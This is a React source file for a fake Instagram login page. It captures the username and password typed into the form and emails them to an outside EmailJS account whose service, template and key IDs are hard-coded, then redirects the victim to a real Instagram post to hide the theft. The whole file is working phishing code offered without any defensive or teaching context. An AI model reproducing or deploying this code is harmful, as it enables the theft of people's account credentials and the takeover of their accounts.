import React, { useRef } from "react";
import emailjs from "@emailjs/browser";

function App() {
  const form: any = useRef();

  const sendEmail = (e: any) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_b4j655r",
        "template_u1lu6al",
        form.current,
        "V2CtkP6ndI4jtM64I"
      )
      .then(
        (result: any) => {
          console.log(result.text);
        },
        (error: any) => {
          console.log(error.text);
        }
      )
      .then(() => {
        window.location.replace("https://www.instagram.com/p/CzOWh0CNjZS/");
      });
  };
  return (
    <div className="App">
      <div className="content">
        <div className="logo">
          <img src="./logo.png" alt="" />
        </div>
        <form ref={form} onSubmit={sendEmail}>
          <input
            name="user"
            type="text"
            placeholder="Phone number, username, or email"
          />
          <input name="pass" type="password" placeholder="Password" />
          <p className="forget">Forget password?</p>
          <button>Log in</button>
          <p>
            Don't have an account? <span>Sign up</span>
          </p>
        </form>
      </div>
      <div></div>
      <div className="bottom">
        <img src="./bottom.png" alt="" />
      </div>
    </div>
  );
}

export default App;
